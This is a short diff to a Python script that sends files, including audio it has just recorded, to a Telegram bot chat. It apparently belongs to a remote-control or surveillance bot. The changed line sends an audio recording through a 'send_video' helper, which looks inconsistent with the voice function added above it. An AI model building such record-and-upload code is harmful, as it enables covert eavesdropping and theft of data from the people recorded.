@@ -25,6 +25,12 @@ def send_audio(path,caption):
         return {'ok':True,'result':result.status_code}
     except Exception as error: return {'ok':False,'result':error}
 
+def send_voice(path,caption):
+    try:
+        result = requests.post(f"https://api.telegram.org/bot{bot_token}/sendVoice", data={'chat_id':root_id,'caption':caption},files={'voice':open(path,'rb')})
+        return {'ok':True,'result':result.status_code}
+    except Exception as error: return {'ok':False,'result':error}
+
 def send_document(path,caption):
     try:
         result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendDocument', data={'chat_id':root_id,'caption':caption},files={'document':open(path,'rb')})
@@ -73,7 +79,7 @@ def start_recording(sec=10):
         time.sleep(sec)
         recorder.stop()
         recorder.release()
-        send_audio(file,'Audio Saved')
+        send_video(file,'Audio Saved')
         return {'ok':True,'result':file}
     except Exception as error:
         send_message(f'Recording Failed: `{error}`')
